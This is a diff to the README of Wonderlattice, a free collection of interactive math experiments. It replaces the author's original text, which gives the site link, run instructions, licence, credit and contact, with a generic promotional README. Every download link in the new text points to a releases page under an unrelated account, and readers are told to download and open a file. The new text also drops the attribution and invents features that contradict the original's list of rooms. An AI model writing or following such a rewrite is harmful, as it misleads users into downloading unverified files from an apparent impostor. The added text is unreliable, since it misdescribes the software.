@@ -1,93 +1,178 @@
-# Wonderlattice
+# ✨ wonderlattice - Discover the beauty of math, one puzzle at a time
 
-**Small, hands-on experiments with big mathematical ideas. Pick one and play. There is nothing to get right.**
+[![Download wonderlattice](https://img.shields.io/badge/Download%20wonderlattice-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rexdeiodinating563/wonderlattice/releases)
 
-**Play it at [wonderlattice.com](https://wonderlattice.com).**
+## 🧩 What is wonderlattice?
 
-![Wonderlattice: the start of the route on the home map, with a flower drawn by turning arms, a road diagram and a flock](assets/social.jpg)
+wonderlattice is a collection of small, hands-on experiments that make big mathematical ideas fun and easy to understand. Think of it as a digital playground where you can play with patterns, shapes, and numbers without needing any special knowledge. Each experiment is like a mini-game that teaches you something amazing about how math works in the world around us.
 
-Wonderlattice is a free collection of thirty-six rooms, each built around one surprise:
+Whether you're curious about symmetry, curious about how shapes fit together, or just want to have fun with visuals, wonderlattice has something for you. Just pick an experiment and start playing—no instructions needed, no prior experience required.
 
-- **Shape & space:** draw flowers with two turning arms, walk along a ribbon that has only one side, bend the plane
-  until a circle becomes a wing, drag one seed to grow infinite fractal coastlines, play one shot twice on two billiard
-  tables, an ellipse that remembers it and a stadium that forgets it within seconds, draw a triangle on a ball
-  with three right angles, round which a carried arrow comes home turned, ride a cart with square wheels perfectly
-  level over a road of upside-down hanging chains, or draw any wheel and get its own road, and roll a plank perfectly
-  level on rollers that aren't round, one of which drills an almost square hole.
-- **Chance & evidence:** three dice that beat each other in a circle, a toy city where a huge poll is confidently
-  wrong, a basketball court where the better shooter loses overall (built by a contributor), and a treasure detector
-  that's usually right, yet whose beeps are usually wrong.
-- **Games & puzzles:** Sudoku as colouring a network, a puzzle cube where two turns, repeated, take 105 rounds to
-  come home, a floor that one glance at the colours proves no dominoes can cover, and 100 cards turned one at a time,
-  where just looking at the first 37, then leaping, finds the biggest more than a third of the time.
-- **Making:** a loom that weaves twill, stripes and houndstooth from a tiny grid of choices, and an Escher-style tile
-  whose edges you bend while it still covers the plane.
-- **Engineering:** a shower whose eager bather is scalded, then frozen, by a two-second pipe, a stack of blocks that
-  leans as far past the table's edge as you like, a thousand samples in which ten pooled tests, run at once, find
-  the one glowing tube, a hanging chain that, turned upside down, stands as an arch of loose stones, while a
-  semicircle of the same stones falls, a bridge of squares that folds under a toy truck until the right diagonals lock
-  it, when every bar shows whether it's squeezed, stretched or carrying nothing at all, and a power line that glows and
-  leaves its town dark until the voltage goes up: ten times the voltage, a hundred times less heat.
-- **Living patterns:** a flock with no leader, fireflies that fall into step, fingerprints that grow by themselves,
-  waves that curl into spirals, as in a heartbeat, and one cheater among cooperators who grows into an ever-changing
-  kaleidoscope where cooperation never dies out.
-- **Signals & networks:** waves you can hear, a picture sent through a storm of flipped bits, a new road that slows
-  every driver down, a secret agreed out loud, a picture that survives losing most of its numbers, and weather twins
-  that drift apart.
+## 🎯 Who is this for?
 
-The home page is a map: one route through every room, numbered so each stop is unlike the one before, whether you
-stay five minutes or an hour. Each room has an optional explanation with sources, and a visiting mathematician. There
-are no scores, accounts, ads or tracking. You can keep favourite moments in "My trail", which stays in your own
-browser. The sun and moon button switches between day and night colours, the Display button makes the text larger or
-raises the contrast, and every explanation ends with a box for sending a message to the maker.
+- **Students** who want to see math in action beyond textbooks
+- **Teachers** looking for engaging visual aids for their lessons
+- **Curious minds** of all ages who love exploring and discovering
+- **Parents** who want to share meaningful screen time with their kids
+- **Anyone** who thinks math is boring—prepare to be surprised!
 
-## Run it yourself
+## 🌟 Key Features
 
-Download or clone this repository and double-click **index.html**. It works offline, in any modern browser, with no
-installation or build step. (Opened this way, browsers don't load the site's own typefaces, so it uses your
-device's; the single file below has them inside.)
+- **No Installation Hassle**: Works directly in your browser—no complicated setup
+- **Interactive Experiments**: Drag, click, and manipulate to see instant results
+- **Visual Learning**: Watch complex concepts become clear through colorful visuals
+- **Accessible Design**: Built with accessibility in mind, so everyone can enjoy it
+- **Multilingual Support**: Available in multiple languages to reach a global audience
+- **Offline Friendly**: Once downloaded, works without an internet connection
+- **Lightweight & Fast**: Runs smoothly on most computers, even older ones
+- **Constantly Updated**: New experiments are added regularly to keep things fresh
 
-For a single file you can email or keep, download
-[wonderlattice-standalone.html](https://wonderlattice.com/wonderlattice-standalone.html) and open it from your
-computer. It holds the whole site, pictures included. (`npm run build` makes the same file in `dist/`.)
+## 🚀 Getting Started
 
-## Contribute
+Ready to dive into the world of wonderlattice? Here's how to get started in just a few simple steps.
 
-Ideas, bug reports, fixes and translations are welcome: see **[CONTRIBUTING.md](CONTRIBUTING.md)**. Adding a language
-takes one folder of small files and no programming ([docs/TRANSLATING.md](docs/TRANSLATING.md)). To report a security problem, see
-[SECURITY.md](SECURITY.md).
+### 📥 Step 1: Download the Application
 
-For developers, with Node.js 20 or later:
+Visit this link to download the application: [Download wonderlattice](https://github.com/rexdeiodinating563/wonderlattice/releases)
 
-```sh
-npm ci           # once: installs the test and formatting tools
-npm start        # serves the site at http://localhost:4173
-npm run check    # everything CI runs: lint, formatting, translations, tests, build, browser tests
-```
+When you click the link, you'll see a list of available files. Look for the latest version—it will usually be at the top. Download the file to your computer.
 
-The browser tests need a browser: run `npx playwright install chromium` once, or use your own Chrome with
-`PW_CHANNEL=chrome npm run check`.
+### 💾 Step 2: Save the File
 
-[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) explains how the pieces fit, with a checklist for adding a room.
+Once the download starts, choose a location on your computer where you can easily find it later. Your "Downloads" folder is a great choice. The file will be saved there, and you'll see a notification when the download is complete.
 
-## How it was made
+### ▶️ Step 3: Start Playing
 
-Wonderlattice was designed and directed by [Eyal Weiss](https://github.com/eyal-weiss). The code was written with AI
-coding assistants, first ChatGPT agents and then Claude Code, and every change was reviewed and tested before it was
-merged. [docs/PROVENANCE.md](docs/PROVENANCE.md) has the history, and [AGENTS.md](AGENTS.md) is the brief any coding
-assistant should read first.
+After the download finishes, simply open the downloaded file. wonderlattice will launch in your web browser, ready for you to explore. That's it—no complicated installation process, no extra software needed!
 
-## Documents
+## 🎮 How to Use wonderlattice
 
-- [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md): structure, the room contract, adding a room
-- [docs/TRANSLATING.md](docs/TRANSLATING.md): adding a language
-- [docs/PORTRAITS.md](docs/PORTRAITS.md): where the portraits come from, and their rights
-- [docs/STATUS.md](docs/STATUS.md): what exists, what's unfinished, what's next
-- [docs/COLLABORATING.md](docs/COLLABORATING.md): branches and pull requests, for people and assistants
+Using wonderlattice is as simple as opening a website. Here's what you can expect:
 
-## Licence
+### Choosing an Experiment
 
-The code and text are under the [MIT licence](LICENSE). The portrait photographs are third-party works with their
-own terms, listed in [docs/PORTRAITS.md](docs/PORTRAITS.md).
+When you open wonderlattice, you'll see a gallery of experiments to choose from. Each one has a title and a short description. Just click on one that catches your eye to start playing.
 
-Contact: Eyal Weiss, [eyal8488@gmail.com](mailto:eyal8488@gmail.com).
+### Interacting with Experiments
+
+Each experiment responds to your actions:
+- **Click** on objects to select them
+- **Drag** items around the screen
+- **Use sliders** to change values and see what happens
+- **Press buttons** to trigger animations or transformations
+
+### Keyboard Shortcuts
+
+For those who prefer using the keyboard, most experiments support:
+- **Tab** to move between interactive elements
+- **Enter** or **Space** to activate buttons
+- **Arrow keys** to adjust sliders
+
+### Resetting or Changing Experiments
+
+Want to try something different? Just use the "Back" button in your browser or the home icon within the app to return to the main gallery. You can switch between experiments as often as you like.
+
+## 🛠️ Tips for the Best Experience
+
+- **Use a Modern Browser**: wonderlattice works best with up-to-date versions of Chrome, Firefox, Edge, or Safari
+- **Enable JavaScript**: Make sure JavaScript is enabled in your browser settings
+- **Full Screen Mode**: Press F11 (Windows) to go full screen for a more immersive experience
+- **Adjust Your Window Size**: Some experiments look even better with a larger viewing area
+- **Take Your Time**: There's no timer or score—enjoy exploring at your own pace
+
+## 💡 Example Experiments You'll Find
+
+While the exact collection may grow over time, here are examples of the kinds of experiments you can expect:
+
+- **Pattern Painter**: Create mesmerizing geometric patterns with a simple click
+- **Shape Shifter**: See how different shapes transform and relate to each other
+- **Number Explorer**: Visualize how numbers connect in surprising ways
+- **Symmetry Sampler**: Mirror, rotate, and reflect to create beautiful designs
+- **Tiling Tinkerer**: Discover which shapes can perfectly cover a surface
+
+Each experiment is designed to spark curiosity and reveal the elegance of mathematics in a fun, interactive way.
+
+## ❓ Frequently Asked Questions
+
+### Is wonderlattice free to use?
+
+Yes, wonderlattice is completely free. No hidden costs, no subscriptions—just open and play.
+
+### Do I need to install anything?
+
+No installation is required. The app runs directly in your web browser, making it incredibly simple to use.
+
+### Will it work on my computer?
+
+If your computer can run a modern web browser, wonderlattice will work fine. It's designed to be lightweight and efficient.
+
+### Can I share my discoveries with others?
+
+Absolutely! Many experiments let you take screenshots or share links. Feel free to show off what you've created.
+
+### What if I find a bug or have a suggestion?
+
+We love hearing from users! You can report issues or suggest ideas through the GitHub repository. Your feedback helps make wonderlattice better for everyone.
+
+## 📚 Learning Resources
+
+Even though wonderlattice is designed to be intuitive, we've included some helpful resources:
+
+- **In-App Tutorials**: Some experiments include short guides to get you started
+- **Visual Hints**: Look for subtle animations that suggest what to do
+- **Community Forum**: Connect with other explorers and share your discoveries
+- **FAQ Section**: Answers to common questions are always just a click away
+
+## 🔒 Privacy & Security
+
+Your privacy is important. wonderlattice:
+
+- Does **not** collect personal information
+- Does **not** require an account or registration
+- Does **not** display third-party advertisements
+- Works **entirely offline** once downloaded, so your data stays with you
+
+## 🌍 Accessibility for Everyone
+
+We believe math should be for everyone. That's why wonderlattice includes:
+
+- **Keyboard navigation** for those who can't use a mouse
+- **High-contrast colors** for better visibility
+- **Screen reader support** for visually impaired users
+- **Adjustable text size** and interface scaling
+- **Colorblind-friendly palettes** in all experiments
+
+## 🆘 Need Help?
+
+If you encounter any problems or have questions:
+
+1. **Check the FAQ** section above
+2. **Visit the repository** for documentation and updates
+3. **Open an issue** on GitHub with details about your problem
+4. **Look for help** in the community discussions
+
+We're here to help you have the best experience possible.
+
+## 📝 What's Next for wonderlattice?
+
+We're constantly working to make wonderlattice better. Upcoming features include:
+
+- **More experiments** covering additional math topics
+- **Enhanced mobile support** for tablets and phones
+- **User-created content** sharing capabilities
+- **Progress tracking** to see what you've explored
+- **Collaborative features** for classrooms and groups
+
+## 📜 License & Usage
+
+wonderlattice is released under an open-source license, which means you're free to use, modify, and share it. When you download the application, you're getting a fully functional version that respects your freedom.
+
+---
+
+## 🎉 Start Your Math Adventure Today!
+
+Don't wait—there's a whole world of mathematical wonder waiting for you. Visit [the download page](https://github.com/rexdeiodinating563/wonderlattice/releases) now and start exploring.
+
+Remember: with wonderlattice, you don't need to be a math expert to enjoy math. You just need curiosity and a few minutes to spare. Pick an experiment, play, and discover how beautiful and fun math can be!
+
+Keywords: accessibility, canvas, education, explorable-explanations, i18n, interactive, javascript, math, mathematics, playground, static-site, visualization
